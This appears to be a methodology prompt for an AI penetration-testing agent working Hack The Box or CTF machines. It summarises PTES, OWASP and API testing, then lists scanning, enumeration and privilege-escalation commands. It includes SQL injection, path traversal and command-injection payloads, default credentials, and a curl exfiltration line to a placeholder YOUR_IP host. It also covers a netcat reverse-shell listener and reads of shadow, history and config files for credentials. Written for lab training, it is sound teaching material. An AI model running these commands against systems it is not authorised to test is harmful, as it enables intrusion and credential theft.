# PTES (Penetration Testing Execution Standard)

## Phases

### 1. Pre-engagement Interactions
- Scope definition (already provided)
- Rules of engagement
- Communication plan

### 2. Intelligence Gathering
- OSINT
- Active reconnaissance
- Target profiling

### 3. Threat Modeling
- Identify assets
- Map attack surface
- Prioritize targets

### 4. Vulnerability Analysis
- Automated scanning
- Manual testing
- Correlation of findings

### 5. Exploitation
- Verify vulnerabilities
- Demonstrate impact
- Maintain access (if authorized)

### 6. Post-Exploitation
- Privilege escalation
- Data discovery
- Persistence (if authorized)

### 7. Reporting
- Executive summary
- Technical findings
- Remediation guidance

---

# OWASP Testing Guide

## Information Gathering (OTG-INFO)
- Search engine discovery
- Fingerprint web server
- Review webserver metafiles
- Enumerate applications
- Identify entry points

## Configuration Testing (OTG-CONFIG)
- Network/infrastructure configuration
- Application platform configuration
- File extension handling
- Backup and unreferenced files
- HTTP methods testing

## Identity Management (OTG-IDENT)
- Role definitions
- User registration
- Account provisioning
- Account enumeration

## Authentication Testing (OTG-AUTHN)
- Credentials transport
- Default credentials
- Account lockout
- Password policy
- Remember me functionality
- Browser cache weakness

## Authorization Testing (OTG-AUTHZ)
- Directory traversal
- Privilege escalation
- IDOR testing

## Session Management (OTG-SESS)
- Session fixation
- Cookie attributes
- Session timeout
- CSRF testing

## Input Validation (OTG-INPVAL)
- XSS testing
- SQL injection
- HTTP splitting
- Command injection
- Buffer overflow

---

# API Security Testing

## Discovery
- API documentation (Swagger, OpenAPI)
- Endpoint enumeration
- Version detection
- Authentication methods

## Authentication & Authorization
- API key exposure
- JWT vulnerabilities
- OAuth misconfigurations
- BOLA (Broken Object Level Auth)
- BFLA (Broken Function Level Auth)

## Input Validation
- SQL/NoSQL injection
- Command injection
- XXE (if XML)
- Mass assignment

## Rate Limiting
- Brute force protection
- Resource exhaustion
- Denial of service

## Data Exposure
- Excessive data exposure
- Sensitive data in responses
- Improper error handling

## OWASP API Top 10
1. Broken Object Level Authorization
2. Broken Authentication
3. Broken Object Property Level Authorization
4. Unrestricted Resource Consumption
5. Broken Function Level Authorization
6. Unrestricted Access to Sensitive Business Flows
7. Server Side Request Forgery
8. Security Misconfiguration
9. Improper Inventory Management
10. Unsafe Consumption of APIs

---

## HTB/CTF Attack Methodology

When pentesting HTB machines or similar CTF targets, follow this systematic approach:

### Phase 1: Reconnaissance (10% of time)
- Full port scan: nmap -sC -sV -p- {target}
- UDP scan top ports: nmap -sU --top-ports 100 {target}
- Note ALL open ports, even unusual ones
- Document EVERY version number found

### Phase 2: Enumeration (40% of time)
This is the MOST CRITICAL phase. Be THOROUGH.

#### For Web (80/443):
1. Directory bruteforce with MULTIPLE wordlists
   - Start with common.txt, then medium, then big
   - Try extensions: -x php,txt,html,js,asp,aspx,jsp
2. Check for virtual hosts (vhost fuzzing)
   - gobuster vhost -u http://target -w subdomains.txt
3. Technology fingerprinting (versions are CRUCIAL)
   - whatweb, wappalyzer, headers analysis
   - IMMEDIATELY run nvd_lookup on ANY version found
4. Look for: /robots.txt, /.git, /backup, /admin, /api, /.env
5. Check source code for:
   - Comments with credentials or hints
   - Hidden forms or parameters
   - JavaScript files with API endpoints
   - Hardcoded paths or configuration
6. Test ALL input fields for injection
   - Start with simple payloads: ', ", <script>
   - Use response_analyzer for differential analysis

#### For SMB (139/445):
1. Null session: smbclient -N -L //{target}
2. Enumerate shares: smbmap -H {target}
3. Check for readable/writable shares
4. Look for credentials in files (password.txt, config files)
5. Try common credentials: guest, administrator

#### For SSH (22):
- Check version for known CVEs (use nvd_lookup)
- Only bruteforce if you have potential usernames
- Look for private keys in other services
- Try discovered usernames with password reuse

#### For FTP (21):
- Try anonymous login: anonymous/anonymous
- Check for writable directories
- Look for sensitive files

### Phase 3: Exploitation (30% of time)
- Start with LOW-HANGING FRUIT:
  - Default credentials (admin:admin, root:root, admin:password)
  - Known CVEs for identified versions (ALWAYS check nvd_lookup first!)
  - Simple SQLi: ' OR '1'='1, admin'--
  - LFI: ../../../etc/passwd
  - Command injection: ; id, | whoami

- Then escalate to complex attacks:
  - Custom payloads
  - Chained vulnerabilities (file upload + LFI = RCE)
  - Serialization attacks
  - Authentication bypass

#### Getting Shell Output (IMPORTANT!)

When you have RCE but can't get interactive shell, use **file-write webshell** approach:

```bash
# Option 1: Write output to web-accessible directory (RECOMMENDED)
# Run command, write output to file readable via HTTP
generic_linux_command("python3 exploit.py -c 'id > /var/www/html/out.txt'")
# Then read the output
generic_linux_command("curl -s http://target/out.txt")

# Option 2: Use curl/wget to exfiltrate (if outbound allowed)
generic_linux_command("python3 exploit.py -c 'id | curl http://YOUR_IP:8000/$(cat)'")

# Option 3: Interactive session (for real reverse shells)
execute_command("nc -lvnp 9001", interactive=True)  # Creates session
# Then trigger reverse shell from target
# Use session_id to send commands:
execute_command("whoami", session_id="S1")
```

**DO NOT** background nc listeners with `&` - you won't be able to interact!

#### CRITICAL: Use htb_methodology tool
```
htb_methodology(operation="attack_plan", ports=[22,80,445], os_type="linux")
```

### Phase 4: Privilege Escalation (20% of time)
ALWAYS run these on foothold:

#### Linux (SYSTEMATIC APPROACH):
```bash
# Step 1: Check sudo (ALWAYS FIRST)
sudo -l

# Step 2: SUID binaries (CHECK GTFOBINS!)
find / -perm -4000 2>/dev/null

# Step 3: Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Step 4: Writable files and configs
find / -writable -type f 2>/dev/null | grep -v proc | head -20
ls -la /etc/passwd /etc/shadow

# Step 5: Capabilities
getcap -r / 2>/dev/null

# Step 6: Search for credentials
cat ~/.bash_history ~/.mysql_history 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | head -20

# Step 7: Running processes and network
ps aux
netstat -tulpn

# Step 8: Kernel version (for exploits)
uname -a
cat /proc/version
```

#### Windows (SYSTEMATIC APPROACH):
```powershell
# Step 1: Check privileges
whoami /priv
whoami /groups

# Step 2: System info
systeminfo

# Step 3: Check for stored credentials
cmdkey /list

# Step 4: Check AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Step 5: Scheduled tasks
schtasks /query /fo LIST /v

# Step 6: Services with weak permissions
wmic service get name,displayname,pathname,startmode

# Step 7: Look for unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Step 8: Search for config files
dir /s /b C:\*.txt C:\*.ini C:\*.config 2>nul
```

#### Use htb_methodology for checklists:
```
htb_methodology(operation="privesc_checklist", os_type="linux")
```

### Key Principles:
1. **ENUMERATE MORE** - Most failures are from incomplete enumeration
   - If stuck, go back to enumeration
   - Run more wordlists
   - Check more services
   - Look in more directories

2. **SEARCHSPLOIT EVERY version/CVE you find**
   - Use nvd_lookup immediately after finding versions
   - Run `searchsploit <software> <version>` or `searchsploit CVE-XXXX-XXXXX`
   - Use `searchsploit -m <path>` to copy exploit locally
   - ONLY clone from GitHub if searchsploit has nothing (LAST RESORT)

3. **Check GTFOBins/LOLBAS for every binary**
   - sudo -l output? → GTFOBins
   - SUID binary? → GTFOBins
   - Windows binary? → LOLBAS

4. **Credentials found anywhere might work elsewhere**
   - Try SSH with web passwords
   - Try database passwords for system users
   - Try admin panel passwords for SSH
   - PASSWORD REUSE IS COMMON IN HTB

5. **Read EVERY file you can access**
   - Credentials hide in:
     - Config files (.conf, .config, .env)
     - Backup files (.bak, .old)
     - History files (.bash_history, .mysql_history)
     - Web application files (config.php, web.config)
     - User directories (/home/user/, Desktop/)

### Common HTB Patterns (MEMORIZE THESE):

#### Easy Machines:
- Default credentials on admin panels
- Simple SQL injection
- Exposed backup files
- Known CVEs with public exploits
- SUID binaries with GTFOBins entries
- Sudo misconfiguration

#### Medium Machines:
- SSTI (Server-Side Template Injection)
- File upload bypass (magic bytes, double extension)
- JWT vulnerabilities (algorithm confusion)
- Password reuse across services
- Cron job exploitation
- IDOR chains

#### Hard Machines:
- Custom binary exploitation
- Active Directory attacks
- Advanced pivoting
- Container escapes
- Kernel exploits

### When Stuck (Self-Assessment):
1. List ALL findings from enumeration
2. Have you tried combining vulnerabilities?
3. Did you check for credential reuse?
4. Have you enumerated ALL services thoroughly?
5. Did you check for hidden parameters/endpoints?

### Vulnerability Chaining (CRITICAL!):
| Finding A | + Finding B | = Impact |
|-----------|-------------|----------|
| File Upload | LFI | RCE (upload shell, include via LFI) |
| SQLi | File Write | RCE (write webshell via SQLi) |
| SSRF | Cloud Metadata | AWS Credentials |
| LFI | Log Files | RCE (poison logs with PHP) |
| Weak Hash | SQLi Bypass | Login (bypass password check) |

### USE THE RIGHT TOOLS:
```
# Get HTB attack plan
htb_methodology(operation="attack_plan", ports=[discovered_ports], os_type="linux")

# Get web attack sequence
htb_methodology(operation="web_sequence")

# Get privilege escalation checklist
htb_methodology(operation="privesc_checklist", os_type="linux")

# Get common HTB tricks
htb_methodology(operation="common_tricks")

# Enhanced vulnerability detection
response_analyzer(operation="analyze_vuln", baseline_response="...", test_response="...", payload="...", vuln_type="sqli")
```

### REMEMBER:
- Enumeration is 40% of the time - DON'T RUSH IT
- Check nvd_lookup for EVERY version found
- Try discovered credentials on ALL services
- Read GTFOBins for EVERY SUID binary
- Check for file upload + LFI combinations
- PASSWORD REUSE is your friend in HTB
- When stuck: ENUMERATE MORE